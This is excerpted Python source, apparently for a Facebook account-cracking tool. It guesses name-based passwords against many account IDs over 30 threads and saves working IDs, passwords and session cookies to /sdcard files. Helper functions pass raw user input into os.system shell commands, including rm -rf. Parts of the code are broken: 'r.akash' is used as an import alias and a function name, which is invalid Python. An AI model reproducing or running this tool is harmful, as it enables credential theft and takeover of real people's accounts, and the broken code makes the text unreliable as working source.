...
from concurrent.futures import ThreadPoolExecutor as r.akashR.AKASH
from string import * 
...
sys.stdout.write('\x1b]2; R.AKASH\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
\033[1;37m  ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
\033[1;37m------------------------------------------------
\033[1;37m Owner   :            R.AKASH
\033[1;37m Facebook:            AKASH GAMING YT
\033[1;37m Github  :            r.akash-king
\033[1;37m Version :            7
\033[1;37m------------------------------------------------ """
def clear():
    os.system("clear")
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back R.AKASH Menu ")
        exit()
...
def r.akash():   
    ...
    print(f'[Y] Subscrib My YouTube Channel ')
    ...
    if select =='1':
       ...
       cutter()
        ...
        os.system('xdg-open https://youtube.com/@akash_annie_100k?si=axxEJ4-eeR7al6nZ)
        pass
    elif select =='F':
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[R.AKASH] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);R.AKASHb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={R.AKASHb};{ckkk}"
                    print(f"\r{R} [R.AKASH-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/R.AKASH_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/R.AKASH_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [R.AKASH-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/R.AKASH_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[R.AKASH] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [R.AKASH-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/R.AKASH_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/R.AKASH_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [R.AKASH-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[R.AKASH] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[R.AKASH] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [R.AKASH-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/R.AKASH_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            print(47*"-")
            with r.akashR.AKASH(max_workers=30) as R.AKASHworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                R.AKASHworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                R.AKASHworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                R.AKASHworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                R.AKASHworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
    ...
    try:
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/R.AKASH.txt') 
        print(47*"-")
...
def sids():
    ...
    clear()
    print('\033[1;37mExample: /sdcard/R.AKASH.txt\033[0;97m')
    print(47*'-')
...
def cutter():
    ...
    R.AKASH = input('Put File Name :')
    print(" ")
    r.akash = input('Saving Put File Name :')
    os.system('touch ' +r.akash)
    os.system('sort -r '+R.AKASH+' | uniq > '+r.akash)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + R.AKASH )
    print(47*'-')
    print("File Saved To :" + r.akash )
    print(47*'-')
    input(f"{S} Press Enter To Back R.AKASH Menu ")
    menu
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/R.AKASH.txt\n') 
        filepath = input("Put File Name: ")
...
def cutter():
    ...
    print(logo)
    print("Removed Successful From File: " + R.AKASH )
    print("New File Saved:" + r.akash )
    print(47*'-')
    input(f"{S} Press Enter To Back R.AKASH Menu ")
    R.AKASH(allkey)       
    
def removef():
        os.system('rm -rf AKASH.R');print(f'\n{R}Files Removed Successfully ...')
        R.AKASH(allkey)            
